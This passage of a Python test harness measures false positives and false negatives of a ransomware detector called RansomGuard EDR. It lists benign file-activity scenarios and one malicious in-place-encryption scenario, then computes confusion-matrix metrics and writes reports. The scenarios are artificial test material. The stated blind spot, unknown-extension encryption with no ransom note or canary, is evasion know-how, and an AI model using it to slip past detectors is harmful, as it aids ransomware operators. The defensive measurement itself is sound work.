    Scenario("normal_editing", "정상 문서 편집", "benign",
             sc_normal_editing, "매직 보존, 저엔트로피 편집"),
    Scenario("photo_editing", "사진 보정·재저장", "benign",
             sc_photo_editing, "JPEG 재인코딩 (native 고엔트로피, 매직 보존)"),
    Scenario("video_convert", "동영상 변환", "benign",
             sc_video_convert, "mp4 (native 고엔트로피, 제외 대상)"),
    Scenario("zip_update", "압축 백업본 갱신", "benign",
             sc_zip_update, "ZIP native 고엔트로피, 매직 보존"),
    Scenario("browser_cache", "브라우저 캐시 폭주", "benign",
             sc_browser_cache, "AppData/Temp 노이즈 경로 대량 쓰기"),
    Scenario("build_temp", "소프트웨어 빌드 임시파일", "benign",
             sc_build_temp, "temp 경로 + .tmp/.log 확장자"),
    Scenario("single_delete", "앱 임시파일 단일 삭제", "benign",
             sc_single_delete, "암호화 동반 없는 단일 삭제 (상관 게이트)"),
    Scenario("legit_admin", "관리자 정상 명령", "benign",
             sc_legit_admin, "vssadmin list / dir / Get-ChildItem"),
    Scenario("security_doc", "보안정책 문서", "benign",
             sc_security_doc, "'encrypted at rest' 문구 있으나 강지표 없음"),
    Scenario("lone_bitlocker", "관리자 BitLocker 활성화", "benign",
             sc_lone_bitlocker, "단일 HIGH, 보강 없음 (corroboration 게이트)"),
    Scenario("os_servicing", "Windows 업데이트 서비싱", "benign",
             sc_os_servicing, "TiWorker 대량 쓰기 (신뢰 actor 제외)",
             use_trust_gate=True),
    Scenario("archive_password", "암호 압축본 생성", "benign",
             sc_archive_password, "7z -p 단일 MEDIUM 힌트"),
    Scenario("log_rotation", "로그 로테이션", "benign",
             sc_log_rotation, ".log 노이즈 확장자 대량 쓰기"),
    Scenario("git_objects", "Git 객체 쓰기", "benign",
             sc_git_objects, ".git/objects zlib 객체 (확장자 없음, 타깃 아님)"),
    Scenario("vmdk_write", "VM 디스크 이미지 쓰기", "benign",
             sc_vmdk_write, ".vmdk 대용량 고엔트로피 (타깃 아님)"),
    Scenario("installer_download", "설치 파일 다운로드", "benign",
             sc_installer_download, ".exe PE 매직 보존 (타깃 아님)"),
    Scenario("music_library", "음악 라이브러리 정리", "benign",
             sc_music_library, ".mp3 재태깅 (native 고엔트로피 제외)"),
    Scenario("cad_save", "CAD 도면 저장", "benign",
             sc_cad_save, ".dwg 저엔트로피 도면 (매직 소실 없음)"),
    Scenario("legit_archive_nopw", "정상 압축(비번 없음)", "benign",
             sc_legit_archive_nopw, "7z a (비번 없음 → 룰 미매칭)"),
    Scenario("vss_resize_legit", "VSS 저장공간 확대(정상)", "benign",
             sc_vss_resize_legit, "maxsize 확대 — 단일 HIGH, 보강 없음"),
    Scenario("backup_software", "백업SW .vbk 생성", "benign",
             sc_backup_software, ".vbk 고엔트로피 (타깃 아님)"),
    Scenario("cloud_sync", "클라우드 동기화", "benign",
             sc_cloud_sync, "docx 매직 보존, 저엔트로피 동기화"),
    Scenario("iso_download", "ISO 다운로드", "benign",
             sc_iso_download, ".iso 대용량 (타깃 아님)"),
    Scenario("db_backup", "DB 백업 .bak", "benign",
             sc_db_backup, ".bak 고엔트로피 (타깃 아님)"),

    # ---- 알려진 한계 (정직한 미탐 측정) ----
    Scenario("obscure_inplace", "미지확장자 제자리 암호화", "malicious",
             sc_obscure_ext_inplace,
             "알려진 매직/확장자/협박문/canary 모두 없음 (콘텐츠 휴리스틱 사각지대)"),
]


# ---------------------------------------------------------------------------
# 탐지 판정 — 제품 정책을 결정론적으로 반영
# ---------------------------------------------------------------------------
def decide_detection(engine: ScoringEngine) -> dict:
    """엔진 최종 상태로 '랜섬웨어 탐지' 여부를 판정한다.

    DETECTED ⇔ (level≥HIGH) OR (CRITICAL 신호 존재) OR
               (HIGH 신호 + 윈도우 내 암호화 활동 보강)
    """
    score = engine.current_score()
    level = engine.current_level()
    sigs = engine.recent_signals(limit=1000)

    reasons: List[str] = []
    detected = False

    if score >= THRESHOLD_HIGH:
        detected = True
        reasons.append(f"위협레벨 {level.value}(점수 {score}) ≥ HIGH")

    # CRITICAL 심각도 신호는 단독 고신뢰 (신뢰 actor 로 제외된 건 빼고)
    crit = [s for s in sigs if s.severity == Severity.CRITICAL
            and not engine._trusted(s)]
    if crit:
        detected = True
        reasons.append(f"CRITICAL 신호 {len(crit)}건({crit[0].name})")

    # HIGH 심각도 + 암호화 활동 보강
    if not detected:
        for s in sigs:
            if s.severity == Severity.HIGH and not engine._trusted(s):
                if engine.has_encryption_activity(exclude=s):
                    detected = True
                    reasons.append(f"HIGH 신호({s.name}) + 암호화 활동 보강")
                    break

    return {
        "detected": detected,
        "score": score,
        "level": level.value,
        "n_signals": len([s for s in sigs if not engine._trusted(s)]),
        "reason": "; ".join(reasons) if reasons else "탐지 임계 미만",
    }


# ---------------------------------------------------------------------------
# 실행 + 집계
# ---------------------------------------------------------------------------
@dataclass
class Result:
    key: str
    title_ko: str
    label: str
    desc_ko: str
    detected: bool
    score: int
    level: str
    reason: str
    outcome: str = ""               # TP | FP | TN | FN


def classify(label: str, detected: bool) -> str:
    if label == "malicious":
        return "TP" if detected else "FN"
    return "FP" if detected else "TN"


def run_all() -> List[Result]:
    results: List[Result] = []
    for sc in SCENARIOS:
        h = Harness(use_trust_gate=sc.use_trust_gate)
        try:
            sc.build(h)
            d = decide_detection(h.engine)
        finally:
            h.cleanup()
        outcome = classify(sc.label, d["detected"])
        results.append(Result(
            key=sc.key, title_ko=sc.title_ko, label=sc.label, desc_ko=sc.desc_ko,
            detected=d["detected"], score=d["score"], level=d["level"],
            reason=d["reason"], outcome=outcome,
        ))
    return results


def compute_metrics(results: List[Result]) -> dict:
    tp = sum(1 for r in results if r.outcome == "TP")
    fp = sum(1 for r in results if r.outcome == "FP")
    tn = sum(1 for r in results if r.outcome == "TN")
    fn = sum(1 for r in results if r.outcome == "FN")
    total = len(results)

    def safe(n, d):
        return (n / d) if d else 0.0

    accuracy = safe(tp + tn, total)
    precision = safe(tp, tp + fp)
    recall = safe(tp, tp + fn)                 # = TPR = 탐지율
    specificity = safe(tn, tn + fp)            # = TNR
    fpr = safe(fp, fp + tn)                     # 오탐률 (False Positive Rate)
    fnr = safe(fn, fn + tp)                     # 미탐률 (False Negative Rate)
    f1 = safe(2 * precision * recall, precision + recall)

    return {
        "counts": {"TP": tp, "FP": fp, "TN": tn, "FN": fn,
                   "positives": tp + fn, "negatives": tn + fp, "total": total},
        "metrics": {
            "accuracy": round(accuracy, 4),
            "precision": round(precision, 4),
            "recall": round(recall, 4),
            "specificity": round(specificity, 4),
            "fpr": round(fpr, 4),
            "fnr": round(fnr, 4),
            "f1": round(f1, 4),
        },
        "detection_rule": (
            "DETECTED ⇔ 위협레벨≥HIGH 또는 CRITICAL신호 또는 (HIGH신호+암호화보강)"
        ),
        "thresholds": {"HIGH": THRESHOLD_HIGH},
        "generated_at": time.strftime("%Y-%m-%d %H:%M:%S"),
    }


# ---------------------------------------------------------------------------
# 출력
# ---------------------------------------------------------------------------
def _pct(x: float) -> str:
    return f"{x * 100:.1f}%"


def print_console(results: List[Result], m: dict) -> None:
    print("\n" + "=" * 78)
    print(" RansomGuard EDR — 오탐(FP)·미탐(FN) 측정 결과")
    print("=" * 78)
    print(f" 탐지 기준: {m['detection_rule']}")
    print("-" * 78)
    print(f" {'시나리오':<24}{'정답':<8}{'판정':<8}{'점수':>6} {'레벨':<9}{'결과':<5}")
    print("-" * 78)
    for r in results:
        gt = "악성" if r.label == "malicious" else "정상"
        pred = "탐지" if r.detected else "미탐지"
        mark = {"TP": "✔", "TN": "✔", "FP": "✗(오탐)", "FN": "✗(미탐)"}[r.outcome]
        title = r.title_ko if len(r.title_ko) <= 22 else r.title_ko[:21] + "…"
        print(f" {title:<22}{gt:<6}{pred:<7}{r.score:>6} {r.level:<9}{r.outcome:<4}{mark}")
    print("-" * 78)

    c = m["counts"]
    mt = m["metrics"]
    print("\n [혼동행렬 Confusion Matrix]")
    print(f"                    예측: 악성     예측: 정상")
    print(f"   실제: 악성 |    TP = {c['TP']:<3}        FN = {c['FN']:<3}   (미탐)")
    print(f"   실제: 정상 |    FP = {c['FP']:<3}(오탐)   TN = {c['TN']:<3}")
    print("\n [지표 Metrics]")
    print(f"   정확도(Accuracy)      = {_pct(mt['accuracy'])}")
    print(f"   정밀도(Precision)     = {_pct(mt['precision'])}")
    print(f"   재현율/탐지율(Recall) = {_pct(mt['recall'])}")
    print(f"   특이도(Specificity)   = {_pct(mt['specificity'])}")
    print(f"   F1 점수               = {_pct(mt['f1'])}")
    print(f"   ▶ 오탐률(FPR)         = {_pct(mt['fpr'])}")
    print(f"   ▶ 미탐률(FNR)         = {_pct(mt['fnr'])}")
    print("=" * 78 + "\n")


def write_outputs(results: List[Result], m: dict, out_dir: Path) -> dict:
    out_dir.mkdir(parents=True, exist_ok=True)

    payload = {
        "summary": m,
        "results": [r.__dict__ for r in results],
    }
    json_path = out_dir / "fp_fn_metrics.json"
    json_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2),
                         encoding="utf-8")

    csv_path = out_dir / "fp_fn_results.csv"
    with open(csv_path, "w", newline="", encoding="utf-8-sig") as f:
        wri = csv.writer(f)
        wri.writerow(["key", "시나리오", "정답라벨", "탐지여부", "점수",
                      "레벨", "결과", "판정근거", "설명"])
        for r in results:
            wri.writerow([r.key, r.title_ko, r.label,
                          "탐지" if r.detected else "미탐지", r.score, r.level,
                          r.outcome, r.reason, r.desc_ko])

    md_path = out_dir / "fp_fn_metrics.md"
    md_path.write_text(_render_markdown(results, m), encoding="utf-8")

    return {"json": str(json_path), "csv": str(csv_path), "md": str(md_path)}


def _render_markdown(results: List[Result], m: dict) -> str:
    c, mt = m["counts"], m["metrics"]
    lines = [
        "# RansomGuard EDR — 오탐·미탐 측정 결과",
        "",
        f"- 생성: {m['generated_at']}",
        f"- 탐지 기준: {m['detection_rule']}",
        f"- 시나리오 총 {c['total']}개 (악성 {c['positives']} · 정상 {c['negatives']})",
        "",
        "## 혼동행렬 (Confusion Matrix)",
        "",
        "| 실제 \\ 예측 | 악성(탐지) | 정상(미탐지) |",
        "|---|---|---|",
        f"| **악성** | TP = {c['TP']} | FN = {c['FN']} (미탐) |",
        f"| **정상** | FP = {c['FP']} (오탐) | TN = {c['TN']} |",
        "",
        "## 지표 (Metrics)",
        "",
        "| 지표 | 값 |",
        "|---|---|",
        f"| 정확도 Accuracy | {_pct(mt['accuracy'])} |",
        f"| 정밀도 Precision | {_pct(mt['precision'])} |",
        f"| 재현율/탐지율 Recall(TPR) | {_pct(mt['recall'])} |",
        f"| 특이도 Specificity(TNR) | {_pct(mt['specificity'])} |",
        f"| F1 Score | {_pct(mt['f1'])} |",
        f"| **오탐률 FPR** | {_pct(mt['fpr'])} |",
        f"| **미탐률 FNR** | {_pct(mt['fnr'])} |",
        "",
        "## 시나리오별 상세",
        "",
        "| 시나리오 | 정답 | 판정 | 점수 | 레벨 | 결과 | 근거 |",
        "|---|---|---|---|---|---|---|",
    ]
    for r in results:
        gt = "악성" if r.label == "malicious" else "정상"
        pred = "탐지" if r.detected else "미탐지"
        lines.append(f"| {r.title_ko} | {gt} | {pred} | {r.score} | "
                     f"{r.level} | {r.outcome} | {r.reason} |")
    lines.append("")
    return "\n".join(lines)


def main() -> int:
    force_utf8()
    results = run_all()
    m = compute_metrics(results)
    print_console(results, m)
    out_dir = Path(__file__).resolve().parent.parent / "reports"
    paths = write_outputs(results, m, out_dir)
    print(" 결과 파일:")
    for k, v in paths.items():
        print(f"   - {k.upper():5}: {v}")
    print()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
